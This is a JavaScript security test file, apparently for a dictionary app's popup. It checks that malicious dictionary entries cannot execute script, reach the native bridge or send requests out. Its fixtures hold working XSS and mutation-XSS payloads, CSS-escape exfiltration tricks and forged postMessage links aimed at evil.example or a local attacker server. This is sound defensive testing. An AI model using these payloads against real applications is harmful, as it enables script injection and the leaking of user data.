// BUG-3762 / BUG-3765：恶意词典内容不能在查词弹窗主文档里执行脚本、调原生桥或外联。
//
// 在真 Chrome 里加载生产 dict-media.js + selection.js + popup.js（与 popup.html 同序），
// 原生桥换成记录器，逐个场景渲染词典块再检查主文档与桥调用记录。沙箱 iframe 里发生了
// 什么，靠词典脚本自己经 postMessage 报一条 error 消息出来（父页面转成 reportJsError
// 调用，记录器能看到）。
//
// 不覆盖：Android addJavascriptInterface 那类「桥注入所有 frame」的宿主行为——那由各平台
// 原生的桥锁定补丁负责（见 docs/specs/2026-10-23-dictionary-script-sandbox.md）。
import fs from 'node:fs';
import http from 'node:http';
import assert from 'node:assert/strict';
import { launchChromeDriver, resolveChrome } from '../../../tool/reader_pitch_headless/cdp_client.mjs';

if (!resolveChrome()) {
  console.log('Chrome unavailable');
  process.exit(77);
}
// 唯一参数是 Dart 测试刚写的临时 payload 文件（仓库里的生产脚本），不是外部输入。
const scripts = JSON.parse(fs.readFileSync(process.argv[2], 'utf8'));  // NOSONAR: path comes from the Dart test harness

const LOCKED = 'fushi-bridge-locked-v1';

// 「攻击者服务器」：记录收到的每个请求（`/page` 除外——那是下面 evalOnServedPage 供测试页
// 用的）。外联场景的测试页从 http://localhost 供、攻击者地址用 127.0.0.1：两者不同源，
// CSP 的 'self' 放不过攻击者；又都是 http 源，Chrome 不会因为顶层是 data: 文档就自己拦掉
// 子 frame 的导航——那样「沙箱自导航」场景测的就是浏览器的限制而不是我们的防护。
const hits = [];
let servedPage = '';
const server = http.createServer((req, res) => {
  if (req.url === '/page') {
    res.setHeader('content-type', 'text/html; charset=utf-8');
    res.end(servedPage);
    return;
  }
  hits.push(req.url);
  res.setHeader('content-type', req.url.startsWith('/nav') ? 'text/html' : 'text/plain');
  res.end(req.url.startsWith('/nav')
    ? '<script>parent.postMessage({__fushiDictSandbox:1,type:"error",message:"from-evil:"+location.href},"*")</script>'
    : '');
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const PORT = server.address().port;
const EVIL = `http://127.0.0.1:${PORT}`;
const PAGE_URL = `http://localhost:${PORT}/page`;
const realHits = () => hits.filter((u) => u !== '/favicon.ico');

async function evalOnServedPage(html, expr) {
  servedPage = html;
  await driver.evalOnPage('<p>reset</p>', '1');
  await driver.evalHere(`(location.href = ${JSON.stringify(PAGE_URL)}, 1)`);
  const deadline = Date.now() + 8000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 20));
    try {
      if (await driver.evalHere(
        "location.href.endsWith('/page') && document.readyState === 'complete' && " +
        "typeof createGlossarySection === 'function'")) break;
    } catch (_) { /* 导航中，上下文还没换好 */ }
  }
  hits.length = 0;
  return driver.evalHere(expr);
}

// parentActive：把父页面的 navigator.userActivation 钉成 isActive = true，模拟「用户刚在
// 释义里随便点了一下」——这正是沙箱脚本借机伪造动作消息的前提。
function page(lockReply, dictStyles, parentActive) {
  const bridge = `
    ${parentActive ? "Object.defineProperty(navigator, 'userActivation', { configurable: true, value: { isActive: true, hasBeenActive: true } });" : ''}
    window.__calls = [];
    window.flutter_inappwebview = {
      callHandler(name, ...args) {
        window.__calls.push({ name, args: JSON.parse(JSON.stringify(args)) });
        if (name === '_fushiLockBridge') return Promise.resolve(${JSON.stringify(lockReply)});
        if (name === 'getDictAsset') return Promise.resolve('window.__extLoaded = 1;');
        return Promise.resolve(null);
      },
    };
    window.dictionaryStyles = ${JSON.stringify(dictStyles || {})};
  `;
  const esc = (s) => s.replace(/<\/script/gi, '<\\/script');
  return '<!doctype html><html><head><meta charset="utf-8">' +
    `<script>${esc(bridge)}</script>` +
    `<script>${esc(scripts.dictMedia)}</script>` +
    `<script>${esc(scripts.selection)}</script>` +
    `<script>${esc(scripts.popup)}</script>` +
    '</head><body></body></html>';
}

// 渲染后的「静止」信号，取代原先每个场景固定等 1.5 秒（20 个场景光等待就 30 秒，CI 上
// 连同页面加载一起冲过 80 秒预算）。全是确定性事件，不押时长：
// ① 有脚本块时，等宿主锁桥的 promise 落定——之后挂不挂沙箱已经决定；
// ② 主文档每张 <img> 都已 load / error——onerror 一类攻击若漏网，此刻已经触发；
// ③ 两帧 rAF + 一个宏任务，让样式 / 布局引起的副作用跑完。
const SETTLE = `(async () => {
  if (typeof __fushiBridgeLockPromise !== 'undefined' && __fushiBridgeLockPromise) {
    await __fushiBridgeLockPromise.catch(() => {});
  }
  await new Promise((r) => setTimeout(r, 0));
  await Promise.all([...document.images].map((img) => (img.complete ? null : new Promise((r) => {
    img.addEventListener('load', r, { once: true });
    img.addEventListener('error', r, { once: true });
  }))));
  await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
  await new Promise((r) => setTimeout(r, 0));
})()`;

// 只有「某个请求 / 脚本**没发生**」又没有完成事件可等的断言才用观察窗口：外联场景（被
// CSP 拦下的请求不产生任何事件）与导出路径（脱离文档的 tempDiv 里的图片）。
const OBSERVE_MS = 300;

// 沙箱脚本在全部消息之后发的哨兵：同一 frame 发给父页面的消息按序投递，父页面收到它时
// 前面的 select / link 已经处理完。
const SANDBOX_DONE = 'sandbox-done';
const sandboxDone = "window.__calls.some((c) => c.name === 'reportJsError' && " +
  `String((c.args[0] && c.args[0].message) || '').includes('${SANDBOX_DONE}'))`;

// 渲染一个词典块，等到静止（SETTLE），再按需等 until 为真（上限 8 秒）或观察 observeMs，
// 然后回报主文档状态。
function renderExpr(content, { until, observeMs } = {}) {
  return `(async () => {
    const details = createGlossarySection('D', [{ content: ${JSON.stringify(content)},
      definitionTags: '', termTags: '', glossaryIndex: 0 }], 0, 0, 1);
    document.body.appendChild(details);
    await ${SETTLE};
    ${until
    ? `for (const deadline = Date.now() + 8000; Date.now() < deadline && !(${until});) {
      await new Promise((r) => setTimeout(r, 20));
    }`
    : ''}
    ${observeMs ? `await new Promise((r) => setTimeout(r, ${observeMs}));` : ''}
    const frames = [...document.querySelectorAll('iframe')];
    return {
      pwned: window.__pwned === undefined ? null : String(window.__pwned),
      scriptsInMain: document.querySelectorAll('body script').length,
      onAttrs: [...document.body.querySelectorAll('*')]
        .flatMap((el) => [...el.attributes].map((a) => a.name))
        .filter((n) => n.startsWith('on')),
      hrefs: [...document.body.querySelectorAll('[href]')].map((el) => el.getAttribute('href')),
      srcs: [...document.body.querySelectorAll('[src]')].map((el) => el.getAttribute('src')),
      frames: frames.map((f) => ({ sandbox: f.getAttribute('sandbox'), csp: f.getAttribute('csp'),
        height: f.style.height })),
      documentCsp: (document.querySelector('meta[data-fushi-popup-csp]') || {}).content || null,
      calls: window.__calls.map((c) => c.name),
      lookups: window.__calls.filter((c) => c.name === 'onLinkClick').map((c) => c.args[0]),
      reports: window.__calls.filter((c) => c.name === 'reportJsError')
        .map((c) => (c.args[0] && c.args[0].message) || ''),
      text: document.body.textContent,
      dictStyle: [...document.querySelectorAll('style.fushi-dict-style')].map((s) => s.textContent).join('\\n'),
    };
  })()`;
}

const SCRIPTED = `<div id="t">static</div>
<script>
  var reach = 'blocked';
  try { reach = typeof parent.flutter_inappwebview; } catch (e) { reach = 'blocked'; }
  try { window.top.__pwned = 'top'; } catch (e) {}
  document.getElementById('t').textContent = 'ran';
  window.__pwned = 'iframe-only';
  setTimeout(function () {
    parent.postMessage({ __fushiDictSandbox: 1, type: 'error',
      message: 'probe:' + document.getElementById('t').textContent + ':' + reach + ':' + (window.__extLoaded || 0) }, '*');
    parent.postMessage({ __fushiDictSandbox: 1, type: 'select', text: 'spam', rect: {} }, '*');
    parent.postMessage({ __fushiDictSandbox: 1, type: 'link', href: 'https://evil.example/', text: 'x', rect: {} }, '*');
    parent.postMessage({ __fushiDictSandbox: 1, type: 'error', message: '${SANDBOX_DONE}' }, '*');
  }, 50);
</script>
<script src="ext.js"></script>`;

// 自己的总时限比 Dart 侧（80 秒）短：超时先报卡在哪个场景、关掉 Chrome 再退出，而不是被
// Dart 一刀切掉、输出全丢、Chrome 成孤儿。每个场景通过时打一行进度。
const HARNESS_DEADLINE_MS = 70000;
let driver = null;
let current = 'chrome launch';
const watchdog = setTimeout(() => {
  console.log(`TIMEOUT after ${HARNESS_DEADLINE_MS} ms in: ${current}`);
  try { driver && driver.close(); } catch (_) { /* 已经在退出 */ }
  server.close();
  process.exit(1);
}, HARNESS_DEADLINE_MS);
const startedAt = Date.now();
let passed = 0;
const step = (name) => {
  console.log(`ok ${passed} ${current} (${Date.now() - startedAt} ms)`);
  current = name;
};

driver = await launchChromeDriver();
try {
  step('1');
  // 1. 结构化内容：标签白名单 + 危险 href。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(JSON.stringify({
      type: 'structured-content',
      content: [
        { tag: 'script', content: "window.__pwned = 'sc-script'" },
        { tag: 'a', href: "javascript:window.__pwned='sc-href'", content: 'link' },  // NOSONAR: attack payload asserted not to execute
        { tag: 'iframe', content: 'framed' },
        { tag: 'span', style: { backgroundImage: 'url(https://evil.example/t.png)' }, content: 'bg' },
      ],
    })));
    assert.equal(r.pwned, null, 'structured content must not execute');
    assert.equal(r.scriptsInMain, 0, 'no <script> element from structured content');
    assert.equal(r.frames.length, 0, 'no iframe element from structured content');
    assert.ok(!r.hrefs.some((h) => /javascript:/i.test(h)), `javascript: href stripped (${r.hrefs})`);  // NOSONAR: checks that the payload href was stripped; nothing is evaluated
    assert.ok(!/evil\.example/.test(JSON.stringify(r)), 'remote background url dropped');
    assert.ok(r.text.includes('link') && r.text.includes('framed'), 'content of unknown tags is kept');
    passed++;
  }

  step('2');
  // 2. 不带脚本的 HTML 释义：净化后留在主文档。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(
      '<img src="x" onerror="window.__pwned=\'onerror\'">' +
      '<svg onload="window.__pwned=\'svg\'"><a xlink:href="javascript:1"><text>s</text></a></svg>' +  // NOSONAR: attack payload asserted not to execute
      '<a href="javascript:window.__pwned=\'click\'">bad</a><a href="https://example.com/">ok</a>' +  // NOSONAR: attack payload asserted not to execute
      '<img src="https://evil.example/t.png"><form action="https://evil.example/"><input></form>' +
      '<p style="background:url(https://evil.example/s.png)">styled</p>'));
    assert.equal(r.pwned, null, `inline handlers must not run (${r.pwned})`);
    assert.deepEqual(r.onAttrs, [], 'on* attributes stripped');
    assert.ok(!r.hrefs.some((h) => /javascript:/i.test(h)), `javascript: href stripped (${r.hrefs})`);  // NOSONAR: checks that the payload href was stripped; nothing is evaluated
    assert.ok(r.hrefs.includes('https://example.com/'), 'normal external link kept');
    assert.ok(!r.srcs.some((s) => /evil\.example/.test(s)), `remote img src stripped (${r.srcs})`);
    assert.ok(!/evil\.example/.test(JSON.stringify(r)), 'no remote reference left anywhere');
    assert.ok(r.text.includes('styled'), 'content kept');
    passed++;
  }

  step('3');
  // 3. 带脚本的 HTML 释义 + 桥锁定成功：脚本只在沙箱 iframe 里跑。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(SCRIPTED, {
      until: `${sandboxDone} && [...document.querySelectorAll('iframe')]` +
        ".every((f) => f.style.height !== '0px')",
    }));
    assert.equal(r.pwned, null, `dictionary script must not touch the main window (${r.pwned})`);
    assert.equal(r.scriptsInMain, 0, 'no script element in the main document');
    assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
    assert.equal(r.frames[0].sandbox, 'allow-scripts', 'sandbox without allow-same-origin');
    assert.ok(r.frames[0].csp && /default-src 'none'/.test(r.frames[0].csp),
      'embedder csp attribute constrains the frame after navigation too');
    assert.ok(r.calls.includes('_fushiLockBridge'), 'page asked the host to lock the bridge');
    assert.ok(r.calls.includes('getDictAsset'), 'external script fetched by the parent');
    const probe = r.reports.find((m) => m.includes('probe:'));
    assert.ok(probe, `sandbox reported back (${r.reports})`);
    assert.ok(probe.includes('probe:ran:blocked:1'),
      `script ran inside the sandbox, could not reach the parent bridge, external script inlined (${probe})`);
    assert.ok(!r.calls.includes('textSelected'), 'unsolicited select from the sandbox is dropped');
    assert.ok(!r.calls.includes('openLink'), 'unsolicited link from the sandbox is dropped');
    assert.notEqual(r.frames[0].height, '0px', 'iframe height follows its content');
    passed++;
  }

  step('4');
  // 4. 宿主回的不是专用值（没实现锁定）：不挂沙箱，只显示净化后的静态内容。
  for (const reply of [true, null, 'ok']) {
    const r = await driver.evalOnPage(page(reply), renderExpr(SCRIPTED));
    assert.equal(r.pwned, null, `no script may run when the bridge is not locked (${reply})`);
    assert.equal(r.frames.length, 0, `no sandbox without a confirmed lock (${reply})`);
    assert.ok(r.text.includes('static'), 'static content still shown');
    assert.ok(!r.calls.includes('getDictAsset'), 'scripts not even fetched');
  }
  passed++;

  step('5');
  // 5. 词典 styles.css：@import 与外部 url() 不进样式表，本地 url() 保留。
  {
    const r = await driver.evalOnPage(page(LOCKED, {
      D: "@import url('https://evil.example/x.css'); .a { background: url(https://evil.example/y.png); }" +
        ' .b { background: url(//evil.example/z.png); } .c { background: url(local.png); }',
    }), renderExpr(JSON.stringify({ type: 'structured-content', content: 'css' })));
    assert.ok(!/evil\.example/.test(r.dictStyle), `remote css refs stripped (${r.dictStyle})`);
    assert.ok(!/@import/i.test(r.dictStyle), '@import stripped');
    assert.ok(r.dictStyle.includes('local.png'), 'local url kept');
    passed++;
  }

  step('6');
  // 6. mXSS：净化后的树直接挂进文档，不经「序列化 → innerHTML」再解析（审查复现过 math 路径）。
  for (const [name, html] of [
    ['math-mglyph-style', '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'mx\';' +
      "flutter_inappwebview.callHandler('updateEntry',{id:1})\"></style></mglyph></table></mtext></math>"],
    ['form-math-reparent', '<form><math><mtext></form><form><mglyph><style></math>' +
      '<img src=x onerror="window.__pwned=\'form\'">'],
    ['svg-style-text', '<svg><style>&lt;img src=x onerror=window.__pwned=\'svg\'&gt;</style></svg>'],
    ['noscript-title', '<noscript><p title="</noscript><img src=x onerror=window.__pwned=\'ns\'>"></noscript>'],
    ['title-link-quote', "<span title=\"<link href='a'><img src=x onerror=window.__pwned='lq'>\">t</span>"],
  ]) {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(html));
    assert.equal(r.pwned, null, `${name}: main document must not execute (${r.pwned})`);
    assert.ok(!r.calls.includes('updateEntry'), `${name}: bridge must not be reached`);
    assert.deepEqual(r.onAttrs, [], `${name}: no live event handler attribute`);
  }
  passed++;

  step('7');
  // 7. 导出卡片路径同样不能经 tempDiv.innerHTML 复活脚本（tempDiv 属于主文档）。
  {
    const mx = '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'export\'">' +
      '</style></mglyph></table></mtext></math>';
    const r = await driver.evalOnPage(page(LOCKED), `(async () => {
      window.lookupEntries = [{ glossaries: [{ dictionary: 'D', content: ${JSON.stringify(mx)},
        definitionTags: '', termTags: '' }] }];
      const html = constructGlossaryHtml(0);
      await new Promise((r) => setTimeout(r, ${OBSERVE_MS}));
      return { pwned: window.__pwned === undefined ? null : String(window.__pwned), html: String(html) };
    })()`);
    assert.equal(r.pwned, null, `export path must not execute (${r.pwned})`);
    assert.ok(!/onerror/i.test(r.html), `exported HTML carries no handler (${r.html.slice(0, 200)})`);
    passed++;
  }

  step('8');
  // 8. 外联兜底：正则追不完的写法（CSS 转义、image-set、imagesrcset、srcset、样式表里的
  //    转义 @import）一个请求都不能发出去——主文档 CSP 的 img/style/font-src 只认本地。
  {
    const cases = [
      `<p style="background:\\75rl(${EVIL}/esc-attr)">a</p>`,
      `<p style="background-image:image-set('${EVIL}/imgset' 1x)">b</p>`,
      `<style>@\\69mport '${EVIL}/imp-esc';</style><p>c</p>`,
      `<link rel="preload" as="image" imagesrcset="${EVIL}/preload 1x"><p>d</p>`,
      `<img srcset="${EVIL}/srcset 1x"><p>e</p>`,
      JSON.stringify({ type: 'structured-content', content: [
        { tag: 'span', style: { backgroundImage: `\\75rl(${EVIL}/sc-esc)` }, content: 'f' }] }),
    ];
    for (const content of cases) {
      const r = await evalOnServedPage(page(LOCKED, {
        D: `@\\69mport '${EVIL}/dictcss-imp'; .x { background: \\75rl(${EVIL}/dictcss-url); }`,
      }), renderExpr(content, { observeMs: OBSERVE_MS }));
      assert.ok(r.documentCsp && /img-src/.test(r.documentCsp), 'document CSP installed');
      assert.deepEqual(realHits(), [], `no request may leave the popup (${content.slice(0, 80)})`);
    }
    passed++;
  }

  step('9');
  // 9. 沙箱自导航：frame-src 在请求发出前拦住，frame 第二次 load 即被移除，导航后的页面
  //    （若真加载了）发来的消息也不被认。
  {
    const r = await evalOnServedPage(page(LOCKED), renderExpr(
      `<div>s</div><script>setTimeout(function(){ location.href = '${EVIL}/nav?w=' + 'TERM'; }, 50);</script>`,
      {
        until: "window.__calls.some((c) => c.name === 'reportJsError' && " +
          "String((c.args[0] && c.args[0].message) || '').includes('sandbox navigated away'))",
        observeMs: OBSERVE_MS,
      }));
    assert.deepEqual(realHits(), [], `sandbox self-navigation must not reach the network (${hits})`);
    assert.equal(r.frames.length, 0, 'navigated sandbox frame is removed');
    assert.ok(!r.reports.some((m) => m.includes('from-evil')), 'messages from a navigated frame are ignored');
    passed++;
  }

  step('10');
  // 10. 父页面有用户激活时（用户随便点了一下释义），沙箱脚本伪造的外链消息也不放行：
  //     父页面判断不了「点的就是这条链接」，所以沙箱来源只认回查词 / sound: 本地音频。
  //     同一 frame 紧接着（同一个回调里、零间隔）发的回查词链接必须照常生效——证明激活
  //     确实成立，外链是被判据挡下而不是因为没激活被顺带丢掉（否则这条断言是空壳）；
  //     零间隔同时钉住「被丢弃的外链不占 300 ms 动作节流」：曾经先占节流再丢，两条
  //     消息间隔一旦被调度挤到 300 ms 以内，真实查词就被吞掉（CI 上实际红过）。
  {
    const r = await driver.evalOnPage(page(LOCKED, {}, true), renderExpr(`<div>s</div><script>
      setTimeout(function () {
        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
          href: 'https://evil.example/leak?q=TERM', text: 'x', rect: {} }, '*');
        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
          href: '?query=word', text: 'word', rect: {} }, '*');
        parent.postMessage({ __fushiDictSandbox: 1, type: 'error', message: '${SANDBOX_DONE}' }, '*');
      }, 50);
    </script>`, { until: sandboxDone }));
    assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
    assert.ok(!r.calls.includes('openLink'),
      `external link forged by the sandbox must not open even with parent activation (${r.calls})`);
    // 只认「查的是 word」：外链若漏过判据，会以 onLinkClick('x') 的形式先占掉节流、把真实
    // 查词吞掉——只断言「有 onLinkClick」时这种回归照样全绿。
    assert.deepEqual(r.lookups, ['word'],
      `only the lookup link fires, so activation was in effect and the dropped external link took no throttle slot (${r.lookups})`);
    passed++;
  }
  step('done');
} finally {
  clearTimeout(watchdog);
  await driver.close();
  server.close();
}
console.log(`PASS ${passed} dictionary sandbox scenarios`);
